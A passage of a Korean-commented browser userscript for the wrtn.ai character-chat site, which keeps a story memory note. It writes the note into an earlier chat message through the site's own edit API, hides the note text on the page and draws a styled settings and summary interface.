  function checkEvidence(memory, freshMessages, prevMemory) {
    // 「」는 근거 안에서 대사를 표시한 것이라 원문의 따옴표와 같이 봅니다(따옴표류는 빼고 비교).
    const norm = s => String(s).replace(/[\s"“”「」]+/g, '');
    const source = norm(freshMessages.map(m => stripBlocks(msgText(m))).join('\n'));
    const prev = norm(prevMemory || '');
    let ok = 0, bad = 0;
    // 근거 줄의 「지문」·"대사" 조각마다 원문에 있는지 봅니다. 대사 끝 괄호 번역은 원문 모양이 달라서 빼고 봐요.
    for (const l of String(memory).split('\n')) {
      if (!/^\s*-?\s*근거\s*[:：]/.test(l)) continue;
      for (const m of l.matchAll(/「([^」]{4,})」|["“]([^"“”]{4,})["”]/g)) {
        const q = norm(m[1] ?? splitTr(m[2])[0]);
        if (source.includes(q) || prev.includes(q)) ok++; else bad++;
      }
    }
    return { ok, bad };
  }

  const editUrls = (chatId, id) => [
    `https://contents-api.wrtn.ai/character-chat/v3/chats/${chatId}/messages/${id}`,
    `https://crack-api.wrtn.ai/crack-gen/v3/chats/${chatId}/messages/${id}`,
  ];
  async function readMessage(chatId, id) {
    const res = await crackGet(`${chatId}/messages/${id}`);
    return res?.data || res;
  }
  // 크랙 메시지 수정은 요청 본문이 102,400바이트를 넘으면 거절(413)합니다.
  //   UTF-8은 한글 한 글자가 3바이트(약 3만 자가 끝)라, 본문을 UTF-16LE(한 글자 2바이트, 약 5만 자)로 보냅니다(WRMC와 같은 방식).
  //   서버가 UTF-16LE를 안 받거나 저장된 글이 다르면 이 페이지에서는 UTF-8로 되돌아가요.
  const PATCH_MAX = 101400;
  let utf16On = true;
  const patchJson = t => JSON.stringify({ message: t });
  const utf8Bytes = t => new TextEncoder().encode(patchJson(t)).length;
  const utf16Bytes = t => patchJson(t).length * 2;
  function utf16Blob(json) {
    const b = new Uint8Array(json.length * 2);
    for (let i = 0; i < json.length; i++) { const c = json.charCodeAt(i); b[i * 2] = c & 255; b[i * 2 + 1] = c >> 8; }
    return new Blob([b], { type: 'application/json; charset=utf-16le' });
  }
  function patchUtf16(url, json) {
    return new Promise((resolve, reject) => {
      if (!gmRequest) { reject(new Error('확장 프로그램이 외부 요청을 허용하지 않았어요.')); return; }
      gmRequest({ method: 'PATCH', url, timeout: 30000, data: utf16Blob(json),
        headers: { 'Content-Type': 'application/json; charset=utf-16le', Accept: 'application/json', Authorization: 'Bearer ' + token(), platform: 'web' },
        onload: r => r.status >= 200 && r.status < 300 ? resolve() : reject(Object.assign(new Error(`HTTP ${r.status}`), { status: r.status })),
        ontimeout: () => reject(new Error('응답 시간이 초과됐어요.')), onerror: () => reject(new Error('네트워크 요청에 실패했어요.')) });
    });
  }
  // 아이폰 Userscripts 앱은 확장 요청에 블롭을 못 실을 수 있어서, 페이지의 fetch로도 한 번 보내 봅니다(크랙 사이트가 자기 API를 부르는 것과 같은 길).
  async function patchUtf16Fetch(url, json) {
    let r;
    try { r = await fetch(url, { method: 'PATCH', body: utf16Blob(json), headers: { 'Content-Type': 'application/json; charset=utf-16le', Accept: 'application/json', Authorization: 'Bearer ' + token(), platform: 'web' } }); }
    catch (_) { throw new Error('전송 불가'); }
    if (!r.ok) throw Object.assign(new Error(`HTTP ${r.status}`), { status: r.status });
  }
  async function writeMessage(chatId, id, nextText) {
    const u8 = utf8Bytes(nextText), u16 = utf16Bytes(nextText);
    const best = utf16On ? Math.min(u8, u16) : u8;
    if (best > PATCH_MAX) throw new Error(`답변+노트가 너무 커서 넣을 수 없어요 (${Math.round(best / 1024)}KB / 100KB). 설정에서 노트 크기를 줄이고 다시 정리해 주세요.`);
    let lastError = null;
    for (const url of editUrls(chatId, id)) {
      if (utf16On && u16 < u8) {
        let transient = false;
        for (const send of [patchUtf16, patchUtf16Fetch]) {
          try {
            await send(url, patchJson(nextText));
            if (msgText(await readMessage(chatId, id)) === nextText) return true;
          } catch (e) {
            // 401·413·5xx·시간 초과는 UTF-16LE 탓이 아니라 다음 주소로. 그 밖의 4xx·전송 불가는 다음 방법(fetch) → 그래도 안 되면 UTF-8로.
            if (e.status === 401 || e.status === 413 || e.status >= 500 || /시간이 초과/.test(e.message)) { lastError = e; transient = true; break; }
          }
        }
        if (transient) continue;
        utf16On = false;
        if (u8 > PATCH_MAX) throw new Error(`이 브라우저에서는 큰 노트를 넣을 수 없어요(UTF-16 전송 안 됨, ${Math.round(u8 / 1024)}KB / 100KB). 이 기기에서는 노트 크기를 3만 자로 줄이거나, 크롬(컴퓨터)에서 넣어 주세요.`);
      }
      try {
        await crack('PATCH', url, { message: nextText });
        const check = await readMessage(chatId, id);
        if (msgText(check) === nextText) return true;
        lastError = new Error('저장 응답은 받았지만 내용이 바뀌지 않았어요.');
      } catch (e) { lastError = e; }
    }
    throw lastError || new Error('메시지를 수정하지 못했어요.');
  }
  // 노트 자리 = 맨 아래에서 AI 답변 두 개 위(전전 버블). 맨 아래를 리롤하거나 OOC 문답을 지워도 노트가 같이 지워지지 않게.
  //   더 위로 올리면 앱에서 오래 대화하는 사이 크랙이 AI에게 보내는 최근 대화 밖으로 밀려날 수 있어서 두 칸만. 답변이 3개가 안 되면 가장 위 답변.
  const pickCarrier = all => { const ai = all.filter(m => msgRole(m) === 'assistant'); return ai.length ? ai[Math.max(0, ai.length - 3)] : null; };

  // ══════════════════════════════════════════════════════════════
  // 7. 웹 화면에서 노트 가리기 (혹시 그려졌을 때)
  // ══════════════════════════════════════════════════════════════
  const pageStyle = document.createElement('style');
  pageStyle.textContent = '.memo-note-hidden{display:none!important}';
  document.documentElement.appendChild(pageStyle);
  // 화면 구조와 상관없이, 노트 글자가 들어 있는 글 조각을 찾아 그 부분만 가립니다.
  const NOTE_MARK = /\[\/\/\]: # ["(]|<!--MEMO_NOTE|MEMO_NOTE/;
  function hideRenderedNotes() {
    if (!document.body) return;
    const walker = document.createTreeWalker(document.body, NodeFilter.SHOW_TEXT);
    const hits = [];
    let node;
    while ((node = walker.nextNode())) {
      const v = node.nodeValue || '';
      if (!NOTE_MARK.test(v)) continue;
      const p = node.parentElement;
      if (!p || p.closest('.memo-note-hidden,#memo-note-host,#memo-note-inline,textarea,input,[contenteditable="true"]')) continue;
      hits.push(node);
    }
    for (let t of hits) {
      // 본문과 노트가 한 글 조각에 붙어 있으면 노트 시작점에서 자릅니다.
      const v = t.nodeValue, idx = v.search(NOTE_MARK);
      if (idx > 0 && v.slice(0, idx).trim()) t = t.splitText(idx);
      const p = t.parentElement;
      const onlyNote = p && p.textContent.trim().length && [...p.childNodes].every(c =>
        c.nodeType === 1 ? (c.tagName === 'BR' || NOTE_MARK.test(c.textContent) || c.classList?.contains('memo-note-hidden')) : (!c.nodeValue.trim() || NOTE_MARK.test(c.nodeValue)));
      if (onlyNote && /^(P|LI|PRE|BLOCKQUOTE|SPAN|DIV)$/.test(p.tagName) && p.childElementCount <= 200 && !p.querySelector('p,li,div')) {
        p.classList.add('memo-note-hidden');
      } else {
        const span = document.createElement('span');
        span.className = 'memo-note-hidden';
        t.parentNode.insertBefore(span, t);
        span.appendChild(t);
      }
    }
  }
  let hideTimer = null;
  new MutationObserver(() => { if (!hideTimer) hideTimer = setTimeout(() => { hideTimer = null; hideRenderedNotes(); }, 250); })
    .observe(document.documentElement, { childList: true, subtree: true, characterData: true });

  // ── 말풍선 위 턴 번호: 어디까지 정리됐는지 눈으로 확인 ──
  //    전체 대화를 순서대로 세서, 사용자 메시지마다 턴이 하나씩 올라갑니다. 노트의 턴 수에 맞춰 보정해요.
  let turnMap = new Map(), turnMapRoom = '', turnMapAt = 0, noteTurns = 0, badgeMiss = new Set();
  async function readAll(chatId, maxPages = 40) {
    const out = []; let cursor = '';
    for (let page = 0; page < maxPages; page++) {
      const { list, next } = await listPage(chatId, cursor);
      out.push(...list);
      if (!(cursor = next)) break;
    }
    const list = liveLine(sortOld(out)).filter(isChat);
    list.cut = !!cursor; // 최대 쪽수까지 읽고도 더 남음 = 앞부분이 빠짐
    return list;
  }
  async function loadTurnMap(chatId, snap) {
    if (String(await getValue('badges', 'on')) === 'off') { turnMap = new Map(); paintBadges(); return; }
    if (turnMapRoom === chatId && Date.now() - turnMapAt < 8000) return;
    if (turnMapRoom !== chatId) badgeMiss.clear();
    turnMapRoom = chatId; turnMapAt = Date.now();
    try {
      const all = await readAll(chatId);
      const map = new Map(); let t = 0;
      for (const m of all) { if (msgRole(m) === 'user') t++; map.set(msgId(m), { turn: t, role: msgRole(m) }); }
      const n = snap?.note, upto = n && map.get(n.upto);
      const offset = n && upto ? n.turns - upto.turn : 0;
      map.forEach(v => { v.turn += offset; });
      turnMap = map; noteTurns = n ? n.turns : 0;
      paintBadges();
    } catch (_) { /* 번호 표시는 보조 기능이라 실패해도 조용히 넘어갑니다 */ }
  }
  function paintBadges() {
    document.querySelectorAll('.memo-turn-badge').forEach(b => { const id = b.dataset.for; if (!turnMap.has(id)) b.remove(); });
    const unknown = [];
    const SEL = '[data-message-id],[data-message-group-id]';
    document.querySelectorAll(SEL).forEach(el => {
      // 묶음 안에 말풍선이 또 있으면 바깥에만 하나 붙입니다 (번호 두 번 나오는 것 방지).
      if (el.parentElement?.closest(SEL)) { [...el.children].forEach(c => c.classList?.contains('memo-turn-badge') && c.remove()); return; }
      const id = el.getAttribute('data-message-id') || el.getAttribute('data-message-group-id');
      const info = turnMap.get(id);
      if (!info) { if (id) unknown.push(id); return; }
      let b = [...el.children].find(c => c.classList?.contains('memo-turn-badge'));
      if (!b) { b = document.createElement('div'); b.className = 'memo-turn-badge'; el.prepend(b); }
      const done = info.turn <= noteTurns && noteTurns > 0;
      b.dataset.for = id;
      const label = info.turn ? `${info.turn}턴${info.role === 'assistant' ? ' 답변' : ''}` : '시작';
      const text = `${label} · ${done ? '정리됨' : '대기'}`;
      if (b.textContent !== text) b.textContent = text;
      b.style.cssText = 'display:flex;width:fit-content;align-items:center;height:20px;padding:0 8px;margin:0 0 6px;border-radius:10px;font:600 11px/1 -apple-system,system-ui,sans-serif;' +
        (done ? 'background:#F4F4F5;color:#8B8B93' : 'background:#ECE8FB;color:#111113');
    });
    // 새 말풍선이 생겼는데 번호가 없으면 잠시 뒤 다시 셉니다.
    //   다시 읽어도 번호가 안 붙는 말풍선(묶음 ID 등)은 한 번만 시도해요. 안 그러면 10초마다 대화 전체를 계속 다시 읽어요.
    const miss = unknown.filter(id => !badgeMiss.has(id));
    if (miss.length && turnMapRoom && Date.now() - turnMapAt > 10000) { miss.forEach(id => badgeMiss.add(id)); const id = chatIdFromPath(); if (id) loadTurnMap(id, snapshot); }
  }
  let badgeTimer = null;
  new MutationObserver(() => { if (!badgeTimer && turnMap.size) badgeTimer = setTimeout(() => { badgeTimer = null; paintBadges(); }, 400); })
    .observe(document.documentElement, { childList: true, subtree: true });

  // ══════════════════════════════════════════════════════════════
  // 8. 아이콘
  // ══════════════════════════════════════════════════════════════
  const ICON = {
    scene: '<rect x="4" y="6" width="16" height="12" rx="2"/><path d="M10 9.5v5l4-2.5z"/>',
    cal: '<rect x="4" y="5" width="16" height="15" rx="2"/><path d="M4 10h16M9 3v4M15 3v4"/>',
    person: '<circle cx="12" cy="8" r="4"/><path d="M4 21c1-4 4-6 8-6s7 2 8 6"/>',
    heart: '<path d="M12 20s-7-4.5-7-10a4 4 0 0 1 7-2.6A4 4 0 0 1 19 10c0 5.5-7 10-7 10z"/>',
    speech: '<path d="M5 5h14v10H9l-4 4z"/>',
    eye: '<path d="M2 12s4-7 10-7 10 7 10 7-4 7-10 7S2 12 2 12z"/><circle cx="12" cy="12" r="3"/>',
    eyeOff: '<path d="M3 3l18 18M10.6 6.1A9.8 9.8 0 0 1 12 6c5 0 9 6 9 6a17 17 0 0 1-3 3.5M6.6 6.6A16.5 16.5 0 0 0 3 12s4 6 9 6a9 9 0 0 0 4.4-1.1"/>',
    pin: '<path d="M12 21s7-6 7-11a7 7 0 0 0-14 0c0 5 7 11 7 11z"/><circle cx="12" cy="10" r="2.5"/>',
    thread: '<circle cx="6" cy="6" r="2"/><circle cx="18" cy="18" r="2"/><path d="M8 6h5a4 4 0 0 1 0 8h-2a4 4 0 0 0 0 8"/>',
    globe: '<circle cx="12" cy="12" r="8"/><path d="M4 12h16M12 4c2.5 2.5 2.5 13.5 0 16M12 4c-2.5 2.5-2.5 13.5 0 16"/>',
    note: '<path d="M4 20h4l10-10-4-4L4 16z"/>',
    home: '<path d="M4 11l8-7 8 7v9H4z"/><path d="M10 20v-5h4v5"/>',
    layers: '<path d="M12 3l9 5-9 5-9-5z"/><path d="M3 13l9 5 9-5"/>',
    users: '<circle cx="9" cy="8" r="3.5"/><path d="M2.5 20c.8-3.5 3.3-5.5 6.5-5.5s5.7 2 6.5 5.5"/><path d="M16 4.5a3.5 3.5 0 0 1 0 7M18.5 14.8c1.7.8 2.7 2.6 3 5.2"/>',
    gear: '<circle cx="12" cy="12" r="3"/><path d="M12 3v3M12 18v3M3 12h3M18 12h3M5.6 5.6l2.1 2.1M16.3 16.3l2.1 2.1M5.6 18.4l2.1-2.1M16.3 7.7l2.1-2.1"/>',
    mark: '<path d="M7 3h10a1 1 0 0 1 1 1v17l-6-4-6 4V4a1 1 0 0 1 1-1z"/>',
    back: '<path d="M15 6l-6 6 6 6"/>',
    close: '<path d="M6 6l12 12M18 6L6 18"/>',
    sparkle: '<path d="M12 3l1.8 5.2L19 10l-5.2 1.8L12 17l-1.8-5.2L5 10l5.2-1.8z"/>',
    down: '<path d="M6 9l6 6 6-6"/>',
    chev: '<path d="M9 6l6 6-6 6"/>',
    check: '<path d="M5 12l5 5 9-10"/>',
    quote: '<path d="M7 7h4v4H8c0 2 1 3 3 3v2c-3 0-5-2-5-5V7zM14 7h4v4h-3c0 2 1 3 3 3v2c-3 0-5-2-5-5V7z"/>',
    refresh: '<path d="M20 11a8 8 0 1 0-2.3 5.7M20 5v6h-6"/>',
    lock: '<rect x="5" y="11" width="14" height="9" rx="2"/><path d="M8 11V8a4 4 0 0 1 8 0v3"/>',
    move: '<path d="M12 19V5M6 11l6-6 6 6"/>',
  };
  const icon = (name, color = 'currentColor', size = 18, sw = 1.8) =>
    `<svg width="${size}" height="${size}" viewBox="0 0 24 24" fill="none" stroke="${color}" stroke-width="${sw}" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true">${ICON[name] || ICON.note}</svg>`;

  // ══════════════════════════════════════════════════════════════
  // 9. 화면 틀
  // ══════════════════════════════════════════════════════════════
  // 위 메뉴 5개. 기억(지난 이야기) / 상태(지금 값) / 인물 / 감정선(감정 변화)
  const TABS = [['home', '홈'], ['timeline', '타임라인'], ['now', '상태'], ['people', '인물'], ['phone', 'etc'], ['settings', '설정']];
  const STORY_TABS = ['명대사', '세계관', FIXED]; // 줄거리·날짜로그·서사 고리는 타임라인 탭에
  const NOW_TABS = ['현재상태', '소지품', '장소·조직']; // 옷차림은 현재상태의 인물 카드 안에
  const PEOPLE_TABS = [['list', '인물'], ['map', '관계도'], ['speech', '호칭·말투'], ['know', '인지'], ['feel', '감정선']];
  const tabFor = k => (['줄거리', '이정표', '날짜로그', '서사 고리', '명대사', '세계관', FIXED].includes(k) ? 'timeline' : STORY_TABS.includes(k) ? 'story' : NOW_TABS.includes(k) ? 'now' : 'people');

  if (!document.getElementById('memo-note-font')) {
    const font = document.createElement('link');
    font.id = 'memo-note-font'; font.rel = 'stylesheet';
    font.href = 'https://fonts.googleapis.com/css2?family=Gowun+Batang:wght@400;700&display=swap';
    (document.head || document.documentElement).appendChild(font);
  }
  const host = document.createElement('div');
  host.id = 'memo-note-host';
  document.documentElement.appendChild(host);
  const root = host.attachShadow({ mode: 'open' });
  root.innerHTML = `
  <style>
    /* 조아메모리ෆ — 흰 종이 · 먹색 글씨 · 칸마다 파스텔 형광펜. 상자 카드와 아이콘 대신 '실'과 '형광펜'으로 구분합니다. */
    :host{all:initial;
      --paper:#FFFFFF;--ink:#1F1D24;--ink2:#4A4752;--graphite:#8A8792;--pencil:#BAB7C2;--mist:#F4F3F6;--rule:#E7E5EB;
      --lilac:#E6E0FA;--sky:#DCEAF8;--blush:#F9E0EA;--apricot:#FBE4D4;--sage:#DFEFE5;--butter:#F7EDCB;
      --mark:var(--lilac);--ok:#2F7A55;--bad:#B23E57;
      --serif:'Gowun Batang','AppleMyungjo','Nanum Myeongjo','Noto Serif KR',serif;
      --sans:'Pretendard','Apple SD Gothic Neo','Noto Sans KR',system-ui,sans-serif}
    *{box-sizing:border-box;font-family:var(--sans);-webkit-tap-highlight-color:transparent}
    button{font:inherit;color:inherit;cursor:pointer}
    button:focus-visible,input:focus-visible,textarea:focus-visible{outline:2px solid var(--ink);outline-offset:2px}
    [hidden]{display:none!important}
    /* 형광펜: 글자 아래 절반만 칠합니다 */
    .hl{background:linear-gradient(transparent 52%,#FFE58A 52%);padding:0 2px;box-decoration-break:clone;-webkit-box-decoration-break:clone}

    .fab{position:fixed;right:12px;bottom:200px;z-index:2147483000;height:40px;padding:0 16px;border-radius:20px;border:1.5px solid var(--ink);background:var(--paper);color:var(--ink);
      display:none;align-items:center;gap:6px;font-size:13px;font-weight:700}
    .fab svg{display:none}
    .fab.show{display:flex}.fab.due{background:#E6E0FA;border-color:#9D8CEB;color:#4B3F8A}
    .under{position:fixed;left:0;right:0;top:-100vh;bottom:-100vh;background:var(--paper);z-index:2147483000;display:none}
    :host(.open) .under{display:block}
    .screen{position:fixed;top:0;left:0;right:0;height:100vh;height:100dvh;z-index:2147483001;background:var(--paper);color:var(--ink);
      display:none;flex-direction:column;overflow:hidden;overscroll-behavior:contain}
    :host(.open) .screen{display:flex}

    header{flex-shrink:0;display:flex;align-items:center;gap:2px;padding:calc(env(safe-area-inset-top) + 16px) 10px 6px 22px}
    .htitle{flex:1;min-width:0;display:flex;flex-direction:column;gap:3px}
    .htitle b{font-family:var(--serif);font-size:22px;font-weight:700;letter-spacing:-.3px;white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
    .htitle span{font-size:12px;color:var(--graphite);white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
    .dot{display:none}
    .hbtn{min-width:40px;height:40px;padding:0 10px;border:0;border-radius:20px;background:transparent;display:flex;align-items:center;justify-content:center;
      color:var(--ink2);font-size:13.5px;font-weight:600;flex-shrink:0}
    .hbtn:active,.hbtn[aria-pressed="true"]{background:var(--mist)}
    .hsave{height:36px;padding:0 18px;border:0;border-radius:18px;background:var(--ink);color:#fff;font-size:14px;font-weight:700;flex-shrink:0;margin-right:6px}
    /* 탭: 글자만, 고른 탭은 형광펜 */
    nav.top{flex-shrink:0;display:flex;justify-content:space-between;gap:14px;padding:6px 22px 10px;border-bottom:1px solid var(--rule);overflow-x:auto;scrollbar-width:none}nav.top::-webkit-scrollbar{display:none}
    nav.top button{flex:0 0 auto;white-space:nowrap}
    nav.top button{border:0;background:transparent;padding:4px 2px;font-size:15px;font-weight:600;color:var(--graphite)}
    nav.top button svg{display:none}
    nav.top button[aria-current="page"]{color:var(--ink);font-weight:800;box-shadow:inset 0 -2px 0 var(--ink)}
    nav.top button[data-arg="settings"]{display:none}
    .screen[data-mode="edit"] nav.top,.screen[data-mode="settings"] nav.top{display:none}
    main{flex:1;min-height:0;overflow-y:auto;overflow-x:hidden;-webkit-overflow-scrolling:touch;overscroll-behavior:contain;padding:18px 22px 32px}
    .editwrap{display:flex;flex-direction:column;height:100%}.editwrap textarea{flex:1;min-height:180px}
    .actions{flex-shrink:0;display:grid;grid-template-columns:minmax(0,1fr) minmax(0,2fr);gap:8px;padding:10px 22px calc(env(safe-area-inset-bottom) + 12px);border-top:1px solid var(--rule)}

    .btn{height:44px;border:1.5px solid var(--ink);border-radius:22px;padding:0 18px;font-size:14px;font-weight:700;background:var(--paper);color:var(--ink);
      display:inline-flex;align-items:center;justify-content:center;gap:6px;white-space:nowrap}
    .btn.pri{background:var(--ink);color:#fff}
    .btn.sm{height:34px;border-radius:17px;font-size:12.5px;padding:0 14px}
    .btn:disabled{opacity:.35;cursor:default}
    .btn svg,.linkbtn svg,.jump .ic,.bigmap svg,.hidebox svg,.quote svg{display:none}
    .linkbtn{border:0;background:transparent;color:var(--graphite);font-size:12.5px;font-weight:700;padding:6px 2px;text-decoration:underline;text-underline-offset:3px}
    .muted{font-size:12.5px;color:var(--graphite);line-height:1.6}
    .empty{padding:28px 4px;color:var(--graphite);font-size:14px;line-height:1.75}
    .h3{font-size:13px;font-weight:700;color:var(--ink2);margin:26px 0 10px}

    /* ── 홈 ── */
    .lede{font-family:var(--serif);font-size:25px;font-weight:700;line-height:1.35;letter-spacing:-.4px;margin:4px 0 6px;word-break:keep-all}
    .lede-sub{font-size:13.5px;color:var(--ink2);margin:0}
    /* 기억의 실: 정리된 구간은 진한 실, 그 뒤로 쌓인 턴은 점선. 매듭 = 정리한 지점 */
    .thread{position:relative;height:56px;margin:22px 8px 6px}
    .thread i{position:absolute;top:20px;height:3px;border-radius:3px}
    .th-done{left:0;background:var(--ink)}
    .th-wait{height:0!important;border-top:3px dotted var(--pencil);top:20px}
    .knot{position:absolute;top:13px;width:17px;height:17px;margin-left:-8.5px;border-radius:50%;background:var(--paper);border:3px solid var(--ink)}
    .knot.small{top:15px;width:13px;height:13px;margin-left:-6.5px;background:var(--ink)}
    .knot.now{border-color:var(--pencil);border-style:dashed}
    .knot span{position:absolute;top:22px;left:50%;transform:translateX(-50%);font-size:11.5px;font-weight:700;color:var(--ink2);white-space:nowrap}
    .knot.now span{color:var(--graphite);font-weight:600}
    .knot.start span{left:0;transform:none}
    .runrow{display:flex;align-items:center;justify-content:space-between;gap:12px;margin-top:14px}
    .runrow span{font-size:14px;color:var(--ink2)}
    .runrow b{color:var(--ink)}
    .cast-row{display:flex;gap:14px;overflow-x:auto;scrollbar-width:none;user-select:none;-webkit-overflow-scrolling:touch;overscroll-behavior-x:contain;touch-action:pan-x pan-y;margin:0 -22px;padding:8px 22px 6px}
    .cast-row::-webkit-scrollbar{display:none}
    .cast-row button{flex:0 0 auto;border:0;background:transparent;display:flex;flex-direction:column;align-items:center;gap:7px;padding:0}
    .cast-row .av{width:52px;height:52px;border-radius:26px;font-size:19px}
    .cast-row button{width:66px}
    .cast-row small{font-size:11px;color:var(--graphite);max-width:66px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;margin-top:-4px}
    .cast-row span{font-size:13px;font-weight:700;max-width:58px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
    .story{margin:0;padding:0 0 0 18px;list-style:none;border-left:2px dotted var(--pencil)}
    .story li{position:relative;font-size:14.5px;line-height:1.7;color:var(--ink2);padding:3px 0}
    /* box-sizing: *는 의사요소에 안 먹어서 테두리가 바깥으로 붙습니다 → 안 넣으면 동그라미가 선에서 오른쪽으로 밀려요 */
    .story li::before{content:"";position:absolute;box-sizing:border-box;left:-26.5px;top:11px;width:15px;height:15px;border-radius:50%;background:var(--paper);border:2.5px solid var(--pencil)}
    .story li:last-child{color:var(--ink);font-weight:600}.story li:last-child::before{border-color:var(--ink)}
    .cast-row button[aria-pressed="true"] .av{box-shadow:0 0 0 3px var(--paper),0 0 0 5px currentColor}
    .profile{margin-top:8px;padding:16px;border-radius:18px;background:var(--paper);border:1.5px solid var(--pb)}
    .pf-head{display:flex;align-items:center;gap:12px}
    .pf-head .av{width:48px;height:48px;font-size:19px}
    .pf-head b{display:block;font-size:17px;font-weight:800;background:linear-gradient(transparent 58%,var(--pb) 58%);width:fit-content;padding:0 2px}
    .pf-tag{display:inline-block;font-style:normal;font-size:12px;font-weight:700;color:var(--pf);margin:2px 0 0}
    .pf-head small{display:block;font-size:12.5px;color:var(--ink2);line-height:1.5;margin-top:2px}
    .pf{display:grid;grid-template-columns:max-content minmax(0,1fr);gap:7px 12px;margin:12px 0 0}
    .pf dt{font-size:12.5px;font-weight:700;color:var(--pf);line-height:1.6}
    .pf dd{margin:0;min-width:0;font-size:14px;line-height:1.6;color:var(--ink)}
    .pf dd>span{display:block;white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
    .pf dd b{font-weight:700;color:var(--ink)}
    .pf dd .pill{margin:0 0 0 4px;font-size:11px}
    .profile .kv{margin-top:12px}
    .profile .kv .k{font-size:12.5px;color:var(--pf)}
    .pf-line{display:block;line-height:1.6}.pf-line .arr{font-style:normal;color:var(--pencil)}
    .pf-g{display:grid;grid-template-columns:max-content minmax(0,1fr);gap:0 10px;align-items:baseline}
    .pf-g+.pf-g{margin-top:4px}
    .pf-to{white-space:nowrap;color:var(--ink2)}
    .pf-g .spchips{display:flex;flex-wrap:wrap;gap:2px 10px;margin:0;align-items:baseline}
    .pf-more{display:block;margin:10px 0 0 auto;border:0;background:transparent;font-size:13px;font-weight:700;color:var(--pf)}
    .nowlines{margin:0;padding:0;list-style:none}
    .nowlines li{font-size:14.5px;line-height:1.7;color:var(--ink2);padding:2px 0}
    /* 목차: 칸마다 왼쪽에 파스텔 색인 띠 */
    .idx{display:flex;flex-direction:column}
    .idx button{border:0;background:transparent;display:flex;align-items:center;gap:12px;padding:12px 0;text-align:left;border-bottom:1px solid var(--rule)}
    .idx button:last-child{border-bottom:0}
    .idx i{width:6px;height:22px;border-radius:3px;flex-shrink:0}
    .idx b{flex:1;font-size:15px;font-weight:600}
    .idx span{font-size:13px;color:var(--graphite)}
    .idx button::after{content:"›";color:var(--pencil);font-size:18px;margin-left:4px}
    .costline{margin:22px 0 0;font-size:12.5px;color:var(--graphite);line-height:1.6}
    .notice{font-size:13px;line-height:1.6;color:var(--ink2);background:var(--butter);border-radius:12px;padding:10px 14px;margin-bottom:16px}

    .hero2{display:flex;flex-direction:column;align-items:center;padding:6px 0 4px}
    .bigring{position:relative;width:184px;height:184px}
    .bigring svg{width:100%;height:100%;display:block}
    .bigring .track{fill:none;stroke:var(--mist);stroke-width:12}
    .bigring .fill{fill:none;stroke:#BDB2F2;stroke-width:12;stroke-linecap:round;transition:stroke-dasharray .4s}
    .bigring.due .fill{stroke:#9D8CEB}
    .bigring .over{fill:none;stroke:#F2B190;stroke-width:12;stroke-linecap:round}
    .bigring.due .ringtext b{color:#4B3F8A}
    .hero-run.due{background:#E6E0FA;border-color:#9D8CEB;color:#4B3F8A}
    .ringtext{position:absolute;inset:0;display:flex;flex-direction:column;align-items:center;justify-content:center;text-align:center}
    .ringtext b{font-size:46px;font-weight:800;letter-spacing:-1.5px;line-height:1;color:var(--ink);font-variant-numeric:tabular-nums}
    .bigring.due .ringtext b{font-size:22px;line-height:1.3;letter-spacing:-.4px}
    .ringtext span{font-size:13px;color:var(--ink2);margin-top:6px}
    .ringtext small{font-size:11.5px;color:var(--graphite);margin-top:4px;font-variant-numeric:tabular-nums}
    .hero-sub{margin:10px 0 2px;font-size:14px;color:var(--ink2)}.hero-meta{margin:0 0 14px;font-size:11.5px;color:var(--pencil)}.hero-foot{display:flex;align-items:center;justify-content:center;gap:8px;margin-top:12px}.hero-foot .inj-sw{margin:0}.hero-dot{color:var(--rule)}.hero-reset{border:0;background:none;padding:0;font-size:12px;color:var(--pencil);text-decoration:underline;text-underline-offset:3px;cursor:pointer}
    .inj-sw{display:flex;align-items:center;justify-content:center;gap:6px;margin:-4px 0 12px;font-size:12px;color:var(--graphite);cursor:pointer}.inj-sw input{display:none}.inj-sw i{width:26px;height:15px;border-radius:999px;background:var(--rule);position:relative;transition:background .15s}.inj-sw i::after{content:"";position:absolute;top:2px;left:2px;width:11px;height:11px;border-radius:50%;background:#fff;transition:left .15s}.inj-sw input:checked+i{background:var(--ink)}.inj-sw input:checked+i::after{left:13px}.inj-sw small{color:var(--bad);font-size:11px}
    .hero-run{min-width:180px}
    .hero-btns{display:flex;flex-direction:column;align-items:center;gap:8px}
    .hero-renew{height:36px;border:0;background:transparent;font-size:13px;color:var(--graphite);text-decoration:underline;text-underline-offset:3px}
    @media (prefers-reduced-motion:reduce){.bigring .fill{transition:none}}
    .comp-h{display:flex;justify-content:space-between;align-items:baseline}
    .comp-n{font-weight:500;color:var(--graphite)}.comp-n b{color:var(--ink);font-weight:700}
    .stack{display:flex;gap:2px;height:12px;border-radius:6px;overflow:hidden;background:var(--mist)}
    .stack i{display:block;height:100%;min-width:3px}
    .stack-cap{height:0}
    .chips2{display:flex;flex-wrap:wrap;gap:6px 8px;margin-top:12px}
    .chips2 button{border:0;background:var(--mist);border-radius:999px;padding:5px 11px 5px 9px;display:inline-flex;align-items:center;gap:6px;font-size:13px;font-weight:600;color:var(--ink)}
    .chips2 i{width:8px;height:8px;border-radius:50%}
    .chips2 span{font-weight:500;color:var(--graphite);font-variant-numeric:tabular-nums}
    .comp{display:flex;align-items:center;gap:18px}
    .donut{position:relative;width:118px;height:118px;flex-shrink:0}
    .donut svg{width:100%;height:100%;display:block}
    .donut circle{fill:none;stroke-width:14}
    .donut-c{position:absolute;inset:0;display:flex;flex-direction:column;align-items:center;justify-content:center}
    .donut-c b{font-size:20px;font-weight:800;font-variant-numeric:tabular-nums}
    .donut-c small{font-size:11px;color:var(--graphite)}
    .legend2{flex:1;min-width:0;display:flex;flex-direction:column}
    .legend2 button{border:0;background:transparent;display:flex;align-items:center;gap:8px;padding:4px 0;text-align:left}
    .legend2 i{width:9px;height:9px;border-radius:3px;flex-shrink:0}
    .legend2 b{flex:1;min-width:0;font-size:13.5px;font-weight:600;white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
    .legend2 span{font-size:12.5px;color:var(--graphite);font-variant-numeric:tabular-nums}

    /* ── 기억 탭 ── */
    .seg{display:flex;gap:6px;overflow-x:auto;scrollbar-width:none;margin:0 -22px 16px;padding:0 22px 2px;position:sticky;top:-18px;z-index:1;background:var(--paper)}
    .seg::-webkit-scrollbar{display:none}
